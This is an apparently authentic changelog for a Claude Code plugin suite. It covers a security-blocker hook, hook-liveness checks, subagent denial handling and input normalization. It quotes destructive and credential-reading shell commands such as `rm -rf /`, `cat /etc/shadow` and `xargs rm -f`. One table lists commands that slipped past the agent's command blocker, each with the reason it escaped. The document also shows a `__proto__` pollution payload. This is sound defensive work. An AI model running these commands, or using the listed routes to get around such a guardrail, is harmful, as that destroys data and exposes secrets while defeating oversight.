   extra hook lines can only ever prove hooks ran, so a union is the conservative direction.
8. **`--min-tools abc` became `NaN`** and silently disabled the pre-filter; a bad value is now
   refused with exit `2`.

Defects 5–8 were found by `/etk:review-mr` on PR #102 **after** self-review had cleared the
change. 5, 6 and 7 are three independent routes to printing an all-clear over a real outage —
the one output this tool exists to never produce.

### Fixed

- **`/doctor` Step 6 checked the legacy log directory** (`~/.claude/logs/<short-name>/`), sizing up
  a file no live hook has touched. It now resolves the real path first. Same defect class as
  2.15.1, in the other place it appeared.

## [2.15.1] - 2026-07-31 — document the real hook-log location

### Fixed

- **`CLAUDE.md` documented the legacy log path**, which is written only by the test suite.
  `logging.ts` prefers **`CLAUDE_PLUGIN_DATA`** (set by CC for live hooks), so real logs go to
  `$CLAUDE_PLUGIN_DATA/logs/` — in practice `~/.claude/plugins/data/ctk-claude-forge/logs/`.
  `~/.claude/logs/continuity/` is the fallback used only when that variable is **unset**.

  This is actively misleading rather than merely stale: the legacy directory *looks* alive,
  because its newest entries come from a test-suite run (`session=unknown`, fixture commands
  like `echo hi` and `rm -rf /`) that reads as "the last time a hook ran". On 2026-07-31 it
  produced a confident, wrong "hooks are not logging at all" conclusion and invalidated a
  null-result probe — while the live log was being written every few seconds the whole time.

  The doc now gives both paths, says which population each holds, and includes the one-line
  resolution command (`find ~/.claude -name permission-feedback.log -newermt "-1 hour"`).

- Noted that the permission log carries `session=`, `agent_id=` and `agent_type=`, so a denial
  can be attributed to the exact subagent that hit it. That makes it the instrument for
  measuring whether a denial costs an agent its report (#65 / #84) — unused until now only
  because it was being read from the wrong directory.

## [2.15.0] - 2026-07-31 — security-blocker stops denying protected literals in inert positions (#65)

### Fixed

- **`security-blocker` no longer denies a command for merely *mentioning* a protected
  path (#65, direction 1).** The sensitive-path check now scans a **scannable projection**
  of the command — the raw text with provably-inert regions blanked — instead of the raw
  text. Measured on a 23-entry corpus: **false positives 11 → 1, false negatives 0**.
  Newly allowed: `echo "…/etc/hosts…"`, a `git commit -m` message naming a system path,
  `grep "/usr/" file.ts`, a quoted-delimiter heredoc body carrying `#!/usr/bin/env`,
  a `#` comment, and a `case` pattern.

### How it is safe

- **No pattern changed.** Every regex in `BASH_SECRET_PATTERNS` /
  `BASH_SYSTEM_DIR_PATTERNS` is byte-identical; only *where they look* changed. The whole
  source diff is 13 insertions / 2 deletions.
- **Fail-closed, which inverts the two designs adversarial review previously demolished.**
  Those granted permission on a positive match (a mutating-verb blocklist; a safe-reader
  allowlist), so a parsing miss **allowed** a dangerous command. Here text is removed from
  the scan only on positive proof, and every ambiguity blanks nothing — the parser's
  failure mode is "scan the whole raw command", i.e. the pre-#65 behaviour. It can
  over-block; it cannot under-block.
- **A pipe re-arms every region.** `echo /etc/hosts | xargs rm -f` really does delete the
  file — echo never opens a path, but a pipe hands its operands to a command that does.
  Any segment whose stdout is piped has no inert region, and no heredoc body is blanked
  when a real pipe (`|`, not `||`) is present. This case was caught by the repo's own
  pinned adversarial-review suite, not by design review.
- **A heredoc body is inert only if something CONSUMES it as data.** A quoted delimiter
  proves the body is not *expanded*; it does not prove the body is not *executed*.
  `sh <<'EOF' … EOF` runs every line, and an intermediate version of this change allowed
  `sh <<'EOF'\ncat /etc/shadow\nEOF`. The consuming command is now checked against an
  allowlist (`cat`, `tee`) — deliberately not a blocklist of interpreters, which would
  leak through `perl`, `awk`, or any local wrapper.
- **argv[0] is never inert** — `/usr/bin/printenv` stays denied. This is why the rule is
  "text except in inert positions" and not "operands instead of text".
- **Quoting alone is not proof of inertness** — `cat "/etc/passwd"` stays denied, because
  inertness is a property of the command + argument slot, never of the quotes.

### Testing

- New `lib/shell-projection.ts` with 40 tests, symlinked into all five plugins (set parity).
- New corpus regression gate asserting 0 false negatives and ≤1 false positive.
- All 404 pinned `security-blocker` assertions unchanged and passing; none weakened or skipped.
- Crippled-check matrix: disabling each of the 6 guards (pipe, heredoc-pipe, substitution,
  redirect, quote-balance, quoted-heredoc-delimiter) turns at least one test red; restore
  control is byte-identical and green.

### Four false negatives were introduced and fixed during development

Recorded because the pattern matters more than the bugs: **every one was in a position the
design called "provably inert", and none was found by reasoning — all four were found by
executing commands.** Two by the repo's own pinned suite and a self-probe, two by
independent adversarial verification that the self-review had already declared clean.

| Escaped as | Why it was wrong |
|---|---|
| `echo /etc/hosts \| xargs rm -f` | echo never opens a path, but a pipe hands its operands to something that does |
| `sh <<'EOF' … EOF` | a quoted delimiter proves the body is not *expanded*, not that it is not *executed* |
| `tee f "<<'Z'"` + next line | the heredoc scanner was a regex with no quote tracking, so a marker inside a quoted argument blanked a real following command |
| `grep -f /etc/shadow log` | `-f` takes a pattern **FILE**; the operand is a path, not a pattern |
| `{ true; echo /etc/hosts; } \| xargs rm -f` | the pipe binds to the group, so the inner segment's `pipedOut` was false |
| `./echo /etc/shadow` | allowlisting by basename let an attacker-chosen binary inherit echo's rule |

### Corrected claim

An earlier version of this work claimed the projection "cannot under-block". **That is
false and has been withdrawn** in both the module header and the design doc. The real
guarantee is narrower and stated as such: ambiguity leaves text *scannable* rather than
granting permission, and each blanked region is proved independently — at whole-command
scope (unbalanced quotes, group-bound pipe, thrown error) the raw command is returned; at
segment scope only the offending segment is skipped.

### Known limitation

- A macOS temp path (`/var/folders/…`) is still denied by the `/var/` pattern. That is a
  pattern-breadth question, not a position question, and is deliberately **not** fixed
  here — tracked separately so it does not ride along with a security-sensitive change.

## [2.14.1] - 2026-07-30 — correct declared skill/command/hook counts (11 · 1 · 12 · 31)

### Fixed

- **`plugin.json` declared `10 skills, 1 agent, 11 commands, 28 shared hooks`; the real numbers are
  `11 · 1 · 12` with `31` shared hooks** (34 registered total = 31 shared + 3 ctk-specific, the basis
  already documented in ctk's CLAUDE.md). The marketplace entry, README and CLAUDE.md were already
  correct — `plugin.json` alone had drifted, so the marketplace listing understated what ctk ships.

Counts corrected against the filesystem, and pinned by a new CI gate. Until now
`scripts/validate-versions.sh` checked *versions* and nothing else, so a declared
count could drift indefinitely while every check stayed green. Check 7 (declared
counts vs the real directories, plus enumerated lists by name) and check 8 (plugin
README version) now close that hole -- see the root CLAUDE.md release checklist.

## [2.14.0] - 2026-07-30 — detect a silent total hook unload (#82, detection half)

### Added

- **Hook-liveness marker.** ctk hooks now stamp a session-scoped marker on SessionStart and on
  every user prompt, and **`/doctor` Step 1b** reads it on demand. Absence of a marker is the
  signal. This is the *detection* half of #82 and needs no reproduction — the trigger is still
  unidentified and **#82 stays open**.
- **`lib/session-key.ts`** — the session-id keying contract as one implementation:
  `isSafeSessionId`, the `payload → CLAUDE_CODE_SESSION_ID → CLAUDE_SESSION_ID → default`
  precedence, `isTrustedSessionKey`, and session-scoped temp paths.
- **`lib/hook-liveness.ts`** — the marker writer.

### Why

On 2026-07-29 a session ran with **zero** ctk hook invocations while every user-facing signal
reported healthy: `claude plugin list` showed all five plugins `✔ enabled`, and the install census
matched. ctk owns 34 registered hooks (31 shared + 3 ctk-specific), so that session had no
`security-blocker`, no permission hooks and no continuity lifecycle — and nothing announced it.
#81's install-path check does **not** close this: the same record/disk inconsistency was present
during the *previous, fully working* session, so it is a correlate, not the signal.

A dead hook cannot report that it is dead, so the reader is not a hook — `/doctor` is a slash
command, evaluated outside the hook system entirely.

### What was cut before release, and why

A **passive statusline warning** — firing on every refresh, which is what would have caught #82
unprompted — was designed, built, verified end-to-end, and then removed. Two rounds of adversarial
review found three defects, *all* of them in that reader:

1. **It would have alarmed on its own rollout.** Its capability check asked "is a stamping-capable
   ctk **installed**?" when the question is "are the **loaded** hooks capable?". Plugin records flip
   at install time while a running session keeps the hooks it started with — so upgrading ctk
   mid-session would have shown "no security guardrails" on a perfectly healthy session until it
   ended, on the very upgrade that installs the feature.
2. **Nothing pinned it.** Replacing the entire user-visible warning with `null` left all six test
   trees green — the same hole the first review round found on the writer half, fixed there and left
   open here.
3. **It sat below four early returns** in the statusline's `main()`, so it could not run on a payload
   lacking `context_window` — inert by placement, which is the writer-side bug this release has a
   test against.

(1) is architectural and unsettled, so the reader waits. Shipping the writer now means the marker
exists in the wild and the reader can land later with no migration.

An earlier revision of that reader used a **self-arming latch** — stamping dropped a flag, and
absence counted only once the flag existed. Review killed that too, and the demonstration is worth
recording: the flag was machine-global, contentless and never expired, so **this repo's own test
suite armed it**, and `/doctor` then reported "FAIL — total or partial hook unload" on a completely
healthy install. Precisely the false positive the latch existed to prevent. *A proxy that anything
can set is not evidence.*

### False positives the shipped writer handles

- **Session too young.** Stamping from `session-loader` (SessionStart) means a healthy session has a
  marker within its first second, before the user acts.
- **Writer and reader keyed differently.** The two layers that can supply a fallback id chose
  *different* constants — `getDefaultSessionId()` in `lib/input.ts` substitutes `unknown`, while
  `lib/session-key.ts` falls back to `default` — so a fully-fallen-back session would write its
  marker under one name and seek it under the other. `stampHookLiveness` now declines to write under
  either, and `/doctor` reports such a session as undetermined rather than broken.

Staleness is deliberately not a failure: `context-monitor` stamps per prompt, so during one long
agentic turn an old marker is healthy.

### Changed

- **`context-monitor` stamps above its fast path.** That hook returns early for every user without a
  configured statusline; a stamp placed after that return would never run for them — inert in exactly
  the way #82's own defect class is. Pinned by a test that fails if the call moves.
- **`resolveSessionId` prefers `CLAUDE_CODE_SESSION_ID`** over `CLAUDE_SESSION_ID`, matching
  `getDefaultSessionId()` in `lib/input.ts`, which is what populates `session_id` on hook payloads.
  (CC **added** `CLAUDE_CODE_SESSION_ID` in v2.1.132 — it is not a rename, and an earlier draft of
  this entry asserted one that never happened.)
- **Two copies of the session-id guard collapsed into one.** `isSafeSessionId` and the resolution
  precedence existed independently in the shared hook and in ctk's statusline, each under a comment
  instructing whoever edited them to keep the two "identical". They are a writer/reader pair on one
  filename, and a rule that two *processes* must agree cannot be maintained by asking two *files* to
  agree — the shape of 2.12.1 (#83), where three wrappers held private copies of `isDenyDecision` and
  one drifted. ctk's statusline re-exports the shared implementation, so its surface is unchanged.
- The context-percentage and last-warn paths now build through `sessionScopedTmpPath` as well, so the
  module's single-sourcing claim holds where it actually matters.

### Verified

- **7019 tests passing**, 1 skipped — a uniform **+31 across all six trees** (a non-uniform delta
  there would mean a broken symlink), plus **5** ctk-local writer tests.
- **Both writers are pinned.** Independent review confirmed by mutation that deleting either stamp
  call site, or moving `contextMonitor`'s below its early return, now fails a test.
- **Two real bugs were caught while verifying this change**, both by running rather than reading —
  `compareVersions` ranked `2.14.0-rc.1` above `2.14.0`, and a records lookup used the bare key `ctk`
  when CC keys them `ctk@claude-forge`. Both belonged to the reader that was subsequently cut; they
  are recorded because the second would have made the feature permanently inert, which is the same
  defect class as #82 itself.
- **No `claude-ctk-*` litter** in the temp directory after a full six-tree run, verified by
  enumeration before and after. (Other suites leave unrelated `claude-context-*` files; that is
  pre-existing and out of scope.)
- ctk is the only plugin whose `dist` changes; the other four rebuild byte-identical.
- Typecheck, lint, and all three validators exit 0.

### Known limits

- Proves *some* ctk hook fired — **not** that all 34 are wired. A partial unload is not covered.
- **Detection is on demand only.** Without the passive reader, nothing surfaces a dead-hook session
  unless the user runs `/ctk:doctor`. That is the main thing #82 still wants, and it is deferred
  rather than solved.
- **False negative on `claude --resume`.** A resumed session reuses its id, and the marker has no
  expiry or per-run nonce, so the previous run's marker satisfies the check.
- Detection only. It does not diagnose #82's trigger.

## [2.13.0] - 2026-07-30 — a denial no longer kills the agent it denies (#65 approach 7A)

### Changed

- **`outputDeny` no longer sets `continue: false`.** The denial is now carried by
  `permissionDecision: 'deny'` alone. Per CC's hook docs, `continue: false` *"takes precedence over
  any event-specific decision fields"* and stops the agent processing **entirely** — so every
  security denial ended the turn of whatever was running, and a dispatched subagent died on the spot
  rather than finishing and reporting.

**The command is still blocked.** `permissionDecision: 'deny'` blocks the tool call; only the
turn-termination is removed. `isDenyDecision` (2.12.1) treats a deny as blocking regardless of
`continue`, and the combined wrappers short-circuit on it before any auto-approve path — which is
exactly why 2.12.1 had to land first.

### Why — measured, not argued

Two-cell controlled experiment. Both cells hit a **real** denial and were told explicitly that the
denial was expected, non-fatal, and that writing their report was their single most important
obligation:

| Cell | Shape | wrote `before` | wrote `after` | Outcome |
|---|---|:--:|:--:|---|
| control | `continue:false` + deny | yes | **no** | died mid-task |
| treatment | `continue:true` + deny | yes | yes | survived, received the injected diff |

The control died anyway — independently confirming R1's finding that instructions in the *dispatch
prompt* cannot rescue a `continue:false` denial. Cost this addresses: **7 of 12** historically lost
subagent reports ended on a denial from this hook, and `/etk:review-mr` had never completed a run.

A first attempt at the treatment cell was **void** — the delta-cache never fired because the target
file was unchanged, and the agent correctly reported its own cell invalid instead of claiming a
result. Protocol corrected (read → *Bash*-append → read) so the denial actually fired.

### Test migration

**128 assertions** moved from `expect(result.continue).toBe(false)` to
`expect(result.hookSpecificOutput?.permissionDecision).toBe('deny')` across 5 files, plus 7
individually-handled sites (inline awaits, a JSON round-trip, a `toMatchObject`, and the symlinked
`output.test.ts` contract). The pinned property changes from *"the turn stopped"* — a mechanism — to
*"the command did not execute"*, which is what actually matters.

`stopReason` is retained throughout: CC ignores it when `continue` is true, but our own hooks and 51
assertions read it as the human-readable denial text. That kept 51 sites out of the migration.

**`run-hook`'s exit code for a denial changes 1 → 0** (it maps `result.continue ? 0 : 1`) — and it
turns out **nothing ever saw it**: `run-hook-wrapper.sh` discards the status (`|| true`) and always
`exit 0`, so Claude Code decides from the emitted JSON exclusively. Its stale JSDoc was corrected.

### The tradeoff this makes — stated explicitly

`continue: false` blocked **event-agnostically** and, per the docs, took precedence over
event-specific fields. `permissionDecision: 'deny'` does not: it is honoured only by the events that
implement it. So the failure mode moves from **fail-closed to fail-open** — if a future CC release
changed or ignored `permissionDecision` handling, a denial would degrade to an allow rather than to a
stop. That risk is not theoretical here: this repo shipped a `hookSpecificOutput` field CC silently
ignored for a year. The tradeoff is judged worth it (the alternative kills every dispatched agent),
but it is a real reduction in defence depth and is recorded rather than implied.

### Verification

Two mutation controls, both required to fail and both did:

| Mutation | Result |
|---|---|
| `deny` → `allow` | **192 tests fail** — the migrated assertions still catch a loss of blocking |
| `continue:true` → `false` | **49 ctk + 4 shared tests fail** — the non-terminal contract is pinned |

**A review of the first draft of this migration caught a real defect in it.** The mechanical rewrite
replaced the `continue` assertion in tests that *already* asserted `permissionDecision`, producing
**47 adjacent duplicate assertions** while ~119 denial tests silently lost the `continue` dimension
altogether — so the very property this release exists to guarantee was pinned by only **3** tests.
Fixed by converting each duplicate into the missing `expect(result.continue).toBe(true)` rather than
just deleting it, which *recovers* the lost dimension: the `continue:true → false` mutation now fails
**49** tests instead of 3. Each affected test asserts both halves — blocked, and not terminated.

Test totals, measured per tree (the trees are **not** uniform — `shared/hooks-infra` runs 1248):

| Tree | Tests |
|---|---|
| `shared/hooks-infra` | 1248 |
| ctk | **2396** (+1: the new regression test) |
| dtk · atk · ftk · etk | 796 each |
| **total** | **6828** (base `7c66170` = 6827) |

Typecheck clean. Lint clean in all 5 plugins via their own `npm run lint`. `validate-versions`,
`validate-manifest-shape`, `validate-shared-test-symlinks` all exit 0. `dist` rebuilt for all five
plugins; only ctk's bundle changes materially (the rest are sourcemap-only, correct tree-shaking).

### Not yet proven

The spike demonstrated survival for a **`Read`** denied by **`read-cache`**. That this hook's
**Bash** denials are now survivable in a real dispatch follows from the shared `outputDeny` contract
but has **not** been observed end-to-end — it needs this release installed and a subagent dispatched
against it. When that is run, check hook **liveness first**: an unnoticed plugin outage (#82) already
made one null result look like evidence this session.

## [2.12.1] - 2026-07-30 — a denial expressed the documented way was not recognised as a denial

### Fixed

- **`isDenyDecision` ignored `permissionDecision: 'deny'`.** Three combined hooks —
  `bash-combined`, `write-combined`, `permission-request-combined` — each carried a private copy
  that tested **only** `continue === false`. A denial expressed the other documented way
  (`permissionDecision: 'deny'` with `continue: true`, which blocks the tool call while letting the
  agent continue) was therefore **not** classified as blocking, so execution fell through to the
  auto-approve fast path. That is precisely the outcome `isBlockingDecision`'s own comment says the
  short-circuit exists to prevent: *"so a dangerous command can never be silently auto-approved past
  the security blocker."*
- **Not hypothetical.** `read-cache` already returns exactly that shape
  (`read-cache.ts:157-167`). It escapes today only because it is wired to `Read`, which none of the
  three wrappers cover — a latent trap, one refactor away from becoming a live auto-allow.
- **Now single-sourced.** `isDenyDecision` is exported from `lib/output.ts`, the module that already
  owns what a denial *looks like*, and the three private copies are deleted. Three copies is how the
  gap opened; a behaviour change was an N-place edit.

Widening is **strictly safe**: the predicate can classify *more* results as denials, never fewer, so
enforcement can only get stronger.

### Why this landed first (issue #65 groundwork)

Measured this session with a two-cell controlled experiment, both cells hitting a real denial and
differing only in the `continue` field:

| Cell | Shape | Wrote `before` | Wrote `after` | Outcome |
|---|---|---|---|---|
| control | `continue:false` + deny | yes | **no** | subagent **died** mid-task |
| treatment | `continue:true` + deny | yes | yes | subagent **survived**, got the diff |

Both agents were told explicitly that the denial was expected, non-fatal, and that writing the
`after` file was their single most important obligation. The control died anyway — independently
confirming R1's finding that dispatch-prompt instructions do not rescue a `continue:false` denial,
and matching CC's documented behaviour that `continue: false` *"takes precedence over any
event-specific decision fields."*

Dropping `continue: false` from security denials is therefore the fix for subagent death (7 of 12
historically lost reports) — but it is **unsafe until this release lands**, because before it, a
`continue:true` denial would have been auto-approved. That change is deliberately **not** in this
release.

### Verification

Mutation control: neutering `isDenyDecision` to `return false` turns 5 tests red across 2 files.
Noted honestly — `permission-request-combined.test.ts` stayed green under that mutation, so its deny
path has **no coverage**; that gap is pre-existing and untouched here. 6,827 tests pass across all
six trees (+1, the new regression test, ctk-local). Typecheck and Biome clean. `dist` rebuilt for all
five plugins: ctk's bundle changes; the other four are sourcemap-only (tree-shaking drops the unused
export).

## [2.12.0] - 2026-07-29 — /doctor reported healthy through a total plugin outage

### Added

- **`/doctor` Step 1a — the recorded install path is now compared against the disk.** Two of
  `/doctor`'s existing signals are metadata-derived and cannot see the disk at all: its Step 1 glob
  (`cache/*/<plugin>/`) matches **stale version folders** left by earlier upgrades, and
  `claude plugin list` renders from `installed_plugins.json` and prints `✔ enabled` regardless of
  what exists. Step 1a reports a `DANGLING` row where the record names a directory that is gone.
- **`DANGLING` is reported as an inconsistent record, not as a verdict.** A dangling path has been
  observed alongside a fully working plugin — on 2026-07-28 ctk's record named a nonexistent
  `ctk/2.10.2` while 43 hook invocations fired from an existing `ctk/2.10.0`. Reporting BROKEN
  INSTALL from that row alone would raise a false alarm and contradict the hook-build and hook-count
  rows, which in that state are correct.
- **Loaded-vs-not is settled by content**, the only check that separated the two observed cases: are
  the plugin's skills and agents present, and do its hooks fire. For ctk that is the decisive signal,
  since it owns all shared hooks — if ctk is genuinely unloaded, `security-blocker`, the auto-approve
  permission hooks, and every lifecycle hook are absent and nothing announces it.
- **Repair steps are given without an unproven attribution.** Both `claude plugin marketplace update`
  and `claude plugin install` were seen to change plugin state; neither was isolated as *the* fix, so
  both are listed with a re-check between. Hooks load only at session start, so a restart is
  required — and skills reappearing is explicitly called out as *not* evidence that hooks came back.

> Observed 2026-07-29: a session started with zero claude-forge plugins loaded while
> `claude plugin list` reported all five `✔ enabled` and `/doctor`'s glob still matched stale version
> folders. All five records were also dangling, and an in-use sweep had run 3 seconds after the prior
> `SessionEnd` — **neither was shown to be the cause.** ctk's record was already dangling during the
> prior session, when the plugin loaded and ran normally. The trigger remains unidentified; this
> change surfaces the inconsistency, it does not explain the outage.

### Fixed

- `/doctor` command Step 1 no longer presents `claude plugin list` as the authoritative discovery
  mechanism; it is now labelled a claim to be confirmed by Step 1a.
- Broken version-extraction glob in the command's fallback scan: `"$CACHE_DIR"/*/. claude-plugin/…`
  carried a stray space, so the path never matched and every version read came back empty.
- The local-dev probe tested `plugins/ctk/.claude-plugin/plugin.json`, which never exists — source
  directories use the legacy long names (`plugins/continuity-toolkit/`).
- Removed `wtk` from the command's plugin list and output sample; no such plugin exists in this
  monorepo. Plugin totals corrected from `6` to `5`.
- `marketplace.json` still advertised **35 hooks** for ctk; the count has been **34** since #79
  removed the `WorktreeCreate` hook.

## [2.11.0] - 2026-07-28 — the WorktreeCreate hook was breaking worktree isolation for every user (closes #78)

### Removed

- **The `WorktreeCreate` hook and its wiring.** `WorktreeCreate` is a **provider** event, not an
  observer: for a `type: "command"` hook Claude Code reads the **last non-empty, ANSI-stripped line of
  stdout as the worktree path**, and once *any* hook is registered it never runs its own
  `git worktree add`. ctk returned `outputSilentSuccess()`, so CC took `{"continue":true,…}` as a
  relative path and failed with *"WorktreeCreate hook returned a path that is not a directory"*.
  **Any user with ctk installed could not use worktree-isolated subagents.** Removing the wiring
  restores CC's native behavior — the call site is `if (hasWorktreeCreateHook()) {hook} else {native git}`,
  and that predicate counts plugin-supplied hooks.
- **`getWorktreeBranch()`** (public API) and the **`worktree_branch`** field on `HookInput`. That name
  appears **zero times** in the CC 2.1.220 binary; both could only ever return `undefined`.

### Fixed

- **`worktree_path` documented accurately.** It is sent on **`WorktreeRemove` only**. `WorktreeCreate`
  fires *before* the worktree exists and carries just `name`, the slug the hook is asked to turn into a
  path — so the removed hook's `input.worktree_path || input.cwd` always fell through to `cwd`, writing
  continuity context into the **parent repo** with `branch: "unknown"`. The capability never worked in
  any respect, not merely the stdout half. Its tests asserted the rejected output and were green
  *because* they encoded the defect.
- ctk `CLAUDE.md` hook table and count basis (35 → **34**; 32 → **31** shared), plus the counting
  recipe — use `grep -c '^registerHook('`, anchored; the unanchored form counts the function
  definition and `unregisterHook(` too.

### Not changed

- **`WorktreeRemove` is untouched and was never broken.** It has no decision control, its output is
  discarded, and it genuinely receives `worktree_path`. The same silent-success payload is safe there
  and fatal on create — the asymmetry is real.

Determination, with byte offsets and verbatim sources:
`docs/reviews/2026-07-28_issue-78-worktreecreate-contract.md`.

## [2.10.2] - 2026-07-28 — security-blocker denials stop quoting the literal that triggered them

`security-blocker` message text only. **No matching behaviour changed** — nothing is newly blocked and nothing newly allowed.

### Fixed

**Denials no longer interpolate the raw regex source into model-facing text** (partial fix for #65).

The message read `Pattern matched: \/etc\/`, which put the protected literal *inside the denial*. Repeating a denial therefore re-triggered it — the ledger entry describing this very trap was itself blocked for describing it. One further instance occurred while writing this change: a command naming the new test's fixture target was denied, and the denial handed back the substring that had caused it.

(An earlier draft of this entry claimed "four self-inflicted denials in a single session on 2026-07-26" with three exemplars. An adversarial review refuted it: that count is single-sourced to issue #65's own body, the ledger's tally for the period is three with items tracing to the 2026-07-25 R1 session, and two of the three exemplars appear in no record. More importantly the framing was **causally inflated** — of the denials that are recorded, only the ledger edit is an instance of *this* defect; the others are instances of the text-matching defect that this release does **not** fix.)

The pattern is now logged on all three denial paths. Only one of them logged it before: the dangerous-command and protected-path `reason` strings carried no pattern, so removing it from the payload would have destroyed the information rather than relocating it. Both were extended here, which is what makes "removed from the payload, kept in the log" true rather than aspirational. A new test asserts the load-bearing property directly: feeding a denial back through the checker must not match.

### Added

**Denials now say what to do instead, and that they are not fatal.**

Two sentences appended to every denial path. The first names the path-based alternative (`Read`, `Grep`, `Glob`), because this check matches command *text* rather than the resource a command resolves to — so a command that merely mentions a protected name is denied while touching nothing sensitive.

The second states the denial does not end the task. **This helps the main thread only, and the repo's own data argues against it helping anything else.** R1 (#51) has two findings that pull in different directions. Finding 1 — the one #65 quotes — says a denial is "not a kill" and records a main-thread call that "received the error and continued normally". Finding 4 measured subagents in a controlled experiment and found "zero assistant turns after the `BLOCKED` result … the agent is never handed a turn in which to react", with probes ignoring instructions given three times that the block was expected.

So for the 7-of-12 lost subagent reports that motivated it, payload text is very likely **inert** — a subagent gets no turn in which to read it. An earlier draft of this entry called the sentence "unproven", which understated the position: this is evidence *against*, not an absence of evidence. It is kept because it costs nothing and helps the caller that does survive, and it is **not** a mitigation for the lost reports. #65 stays open.

**Five tests for denial payload hygiene**, a surface that previously had none — no test asserted anything about denial message text.

### Not in this release

The three known **under**-blocking gaps (trailing-separator, case-sensitivity, and the two inert `envrc` lookaheads) are deliberately excluded: all three *add* blocking and must not ride along with a message change. Narrowing the match from command text to resolved target — the principled fix — remains unattempted; it needs real shell parsing, and this file's own comments record that enumerating metacharacters "is unbounded and fails silently, one character at a time".

## [2.10.1] - 2026-07-27 — one derivation for the log-level variable, and a CI check that docs match code

Shared library, tests and CI. No skill, agent or command behaviour changed.

### Fixed

**The log-level env var name was derived in two places, and the second had no tests** (closes #74).

`lib/logging.ts:122` and `getHookEnvironment()` in `types.ts:1070` each built `${CLAUDE_PLUGIN_NAME.toUpperCase()}_LOG_LEVEL` independently. The `types.ts` copy is **public API** — re-exported from all five plugins — and had **zero tests and zero callers**, so nothing constrained it. The two copies had already diverged in behaviour: it neither lower-cased nor validated the value, so `<PLUGIN>_LOG_LEVEL=BOGUS` returned `'BOGUS'` typed as a `LogLevel` while the logger itself fell back to `'warn'`. One variable, two answers.

Both readers now call `logLevelEnvVarName()` and `resolveLogLevel()`, exported from `lib/logging.ts`.

**Log-level validation accepted inherited prototype keys.** The check was `envLevel in LOG_LEVEL_VALUES`, which consults the prototype chain. Because the value is lower-cased first, the reachable inputs are only the prototype keys that are already lower-case: `constructor` and `__proto__`. Neither indexes to `undefined` — `in` returning true means the property is reachable, so they index to the Object constructor and to `Object.prototype` respectively. The damage is downstream in `shouldLog()`, where `number >= function` and `number >= object` both coerce to `NaN` and compare false, silencing **every** log line instead of falling back to `warn`. Now an own-property check.

(An earlier draft of this entry cited `<PLUGIN>_LOG_LEVEL=toString` as the trigger and said it indexed to `undefined`. Both halves were wrong — `toString` arrives as `tostring`, which is not a key under either check, so that input was never a bug. Corrected before release after an adversarial review refuted it.)

### Added

**CI enforcement of the log-level identity** — check 6 of `scripts/validate-versions.sh`, already wired to the `versions` job. Per plugin it asserts:

- `CLAUDE_PLUGIN_NAME` is a valid shell identifier
- `vitest.config.ts` runs under the **same** name as `run-hook-wrapper.sh` (this disagreement *is* #63)
- `CLAUDE.md` documents exactly `UPPER(name)_LOG_LEVEL` and no other `*_LOG_LEVEL` name

This is the signal that did not exist when #63 shipped: corrupting the documented name previously left the plugin suite, the shared suite and this script all at exit 0, and nothing under `scripts/`, `.github/` or `tools/` mentioned `LOG_LEVEL` at all. Guarded by three negative fixtures — `tests/fixtures/versions/bad-{logvar,plugin-id,test-identity}/` — so deleting the check cannot pass silently, since check 6 skips any plugin without a wrapper.

**29 tests for `getHookEnvironment()` and the identity helpers** — `tests/lib/hook-environment.test.ts`, linked into all five plugins. This surface previously had none.

### Changed

Plugin names are now **required** to match `[A-Za-z_][A-Za-z0-9_]*`, stated in root `CLAUDE.md`'s "Adding a New Plugin" procedure and enforced in CI. `export AI-TOOLKIT_LOG_LEVEL=debug` is rejected by POSIX `sh` as "not a valid identifier" while Node accepts the key, producing a knob that can be read but never set. The name is deliberately **not** normalised in code — normalising would let a violating name work by accident and re-open the gap between the log directory name and the variable name.

## [2.10.0] - 2026-07-25 — the allowlist is gone; a fifth inert handler was inert twice over

`dist` is rebuilt (shared library + hook source changed).

Closes the defect class that produced 2.8.4, 2.8.5 and 2.9.0. Each of those
releases fixed the *instances* — a handler reading a field the normalizer had
already deleted — by adding names to an allowlist. This removes the allowlist.

### Changed — `normalizeInput` forwards instead of allowlisting

- **`lib/input.ts` now forwards every top-level field Claude Code sends** and
  denies exactly one (`__proto__`). Previously it rebuilt the input from a fixed
  `passThrough` array, so any field not named there was silently deleted before
  handlers ran. A handler reading a dropped field was **inert** and degraded to a
  plausible default (`f || 'unknown'`, `if (!f) return`) rather than erroring —
  invisible to the type checker, because each such handler declared its own
  `interface X extends HookInput { f }`.
- The allowlist enforced no security boundary; it is Claude Code's own payload
  either way. It bought nothing and cost silent data loss.
- 2.9.0's structural guard is **replaced**. It parsed one declaration syntax and
  the review of #53 defeated it with six ordinary ones (type alias, second base
  type, indirect base, inline cast, bracket access, destructuring). Its
  replacement, `tests/lib/input-field-forwarding.test.ts`, asserts behaviour
  through `parseHookInput`, so no syntax can evade the forwarding checks.
- **But forwarding does not close the whole class, and an earlier draft of this
  entry wrongly implied it did.** The defect has two halves: (a) the normalizer
  drops a field the handler reads, and (b) the handler reads a name Claude Code
  never sends. Forwarding fixes (a) only. 2.9.0's own defect — three handlers
  reading `tool_output` — is (b), and under a denylist `tool_output` is forwarded
  happily while the handler stays inert. The old guard caught that as a
  side-effect of checking declared names against a capture-curated allowlist.
  Two things now cover (b) instead, and between them they are stricter:
  - **The compiler.** With every local `interface X extends HookInput` deleted
    and no index signature on `HookInput`, a handler reading `input.tool_output`
    is a build error (`TS2339`), not a silent `undefined`.
  - **A one-rule guard** asserting no hook source re-declares `HookInput`
    locally — the form in which all seven historical instances were written, and
    the one path the compiler cannot see. Add the field to `HookInput` instead,
    next to the capture that justifies it.
- **Prototype-pollution guard, at parse time.** Forwarding introduces a vector
  the allowlist was safe from by accident: a payload carrying `__proto__` under a
  per-key assignment loop swaps the object's prototype and injects fields a
  handler then reads (verified — `input.injected` reads `PWNED`). `safeJsonParse`
  now uses a `JSON.parse` reviver that drops `__proto__` at **every depth**.
  - A first cut scrubbed only the top level. Adversarial review showed that left
    every **nested** object — `tool_input`, `tool_response` — holding an own
    `__proto__` data property forwarded straight from the parse, which
    round-trips through `JSON.stringify` into any file a hook writes. Latent
    rather than live (nothing in-repo copies those with `[[Set]]` semantics), but
    the normalizer should hand handlers a clean object.
  - An array payload (`[1,2,3]`) used to pass the object guard and spread into
    `{"0":…,"1":…}` — a "valid" `HookInput` built from junk, one own property per
    element. Now rejected, as is an array `tool_input`.
  - `getField()` resolved through the prototype chain, so
    `getField(input, 'constructor')` returned a truthy native function for an
    empty `tool_input`. Own-property check added.

### Fixed — `phi-output-redactor` was inert for two independent reasons

- **The field is `delta`.** Captured live from CC 2.1.220 (41 records, one key
  set across all of them, temporary
